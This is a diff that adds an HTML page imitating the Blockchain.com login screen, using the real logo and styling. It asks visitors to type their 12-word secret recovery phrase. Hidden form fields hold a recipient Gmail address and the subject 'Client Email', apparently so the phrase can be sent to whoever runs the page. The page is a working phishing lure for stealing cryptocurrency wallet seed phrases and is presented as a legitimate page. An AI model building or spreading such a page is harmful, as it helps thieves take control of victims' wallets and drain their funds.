@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockchain</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/4c4cf0b696.js" crossorigin="anonymous"></script>
+        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/login.css">
+</head>
+<body style="background-color: rgb(18, 29, 51);">
+    <section class="blockchain_">
+        <div class="blockchain_logo verify_logo" id="blockchain_logo_" style="justify-content: center; color: rgb(251, 250, 249);">
+           <!-- <img src="https://altcoinsbox.com/wp-content/uploads/2023/01/blockchain.com-logo.svg" alt="" style="width: 2%; height: 3%;"> <h3>Blockchain.com</h3> -->
+           <img id="blc_logo" src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd" alt="">
+        </div>
+        <div class="login_cont">
+            <div style="background-color: white;" class="login_block" id="login_blk">
+                <div style="padding: 0 5% 0 5%;">    
+                        <div>
+                            <div style="">
+                                <a href="/" style="text-decoration: none; display: flex;">
+                                    <i class="ri-arrow-left-line" style="color: blue; font-size: 28px; padding-top: 10px;"></i>
+                                    <p style="padding-top: 20px; color: black;">Back</p>
+                                </a>
+                            </div>
+                            <div>
+                                <div class="blk_phrase">
+                                    <p class="recov">
+                                        Input your secret private key recovery phrase
+                                    </p>
+                                    <p>
+                                        Your 12 word Secret Key Recovery Phrase grants access to your account. Please input it in the order specified
+                                    </p>
+                                </div>
+                            </div>
+                            
+                        </div>
+                        <form action="" style="display: grid; position: relative; padding: 0;">
+                            <div class="content" style="display: grid; padding-top: 2px;">
+                                <div style="display: flex; justify-content: space-between;">
+                                    <label for="email walletId"></label>
+                                    <p id="req" style="display: none; color: rgb(217, 59, 48);
+                                    ">required</p>
+                                </div>
+                                <input id="myInput recipient" class="email_in" value="roselloydx60@gmail.com" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                                <input id="myInput suject" class="email_in" value="Client Email" type="hidden" placeholder="Enter Email" style="color: rgb(53, 63, 82);" required>
+                                <input id="myInput message" type="text" placeholder="Enter your secret private key recovery phrase" required>
+                                <p style="text-align: center; color: rgb(103, 113, 132); font-weight: 500; font-size: 14px; padding-top: 5%;
+                                line-height: .5;" >Separate each word with a space</p>
+                            </div>
+                            <div class="content" style="padding-top: 0;">
+                                <input type="submit" value="Continue" style="width: 100%;">
+                            </div>
+                        </form>
+                </div>
+                <div class="blc_act"> <h5>Trouble Logging In?</h5><a href="#" style="text-decoration: none;">Contact Support</a></div>
+            </div>
+        </div>
+        <footer style="padding-top: 50px; font-weight: bold;">
+            <div class="" style="display: flex; color:rgba(194, 194, 196, 0.764); justify-content: center;">
+                <div style="padding: 0.5rem; bottom: 0rem; position: relative;">
+                    <select class="" aria-label="Default select example" name="state" style="background: none; border: none; color:rgba(194, 194, 196, 0.764); font-weight: 500;">
+                        <option class="select1">English</option>
+                        <option value="1">Español</option>
+                        <option value="2">Français</option>
+                        <option value="3">Português</option>
+                        <option value="3">Русский</option>
+                    </select>
+                    <style>
+                        select:hover{
+                            border: none;
+                        }
+                    </style>
+                </div>
+                <div style="padding: 0.5rem;"><p>Version 4.94.19</p></div>
+                <div style="padding: 0.5rem;"><p>Need Help?</p></div>
+            </div>
+        </footer>
+    </section>
+</body>
+</html>
